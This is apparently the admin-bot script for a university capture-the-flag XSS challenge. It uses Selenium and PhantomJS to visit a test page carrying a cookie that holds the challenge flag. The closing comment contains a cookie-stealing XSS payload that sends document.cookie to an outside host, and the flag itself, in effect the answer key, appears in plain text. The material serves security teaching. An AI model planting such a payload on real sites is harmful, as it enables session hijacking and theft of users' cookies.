#!/usr/bin/python

# this is the 'admin' who will look at the page

url = "http://testxss.ap-northeast-1.elasticbeanstalk.com/index.php"
# get the driver from http://chromedriver.storage.googleapis.com/index.html?path=2.21/

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pyvirtualdisplay import Display
import time


display = Display(visible=0, size=(800, 800))  
display.start()

# driver = webdriver.Chrome()
driver = webdriver.PhantomJS()
driver.get(url)
driver.add_cookie({"name": "flag", "value":"COMP3441{eXtreme_S1t3_Scripting}"})
elem = driver.find_element_by_id("view")
elem.click()
while True:
	try:
		searchBar = driver.find_element_by_id("searchCourseField")
		searchBar.send_keys('subject2')
		searchBar.send_keys(Keys.RETURN)
		break
	except:
		print 'not working yet'
		time.sleep(1)
time.sleep(50)
assert "No results found." not in driver.page_source
driver.close()


# <script>
# new Image().src="http://rootkit.download/"+encodeURI(document.cookie);
# </script>
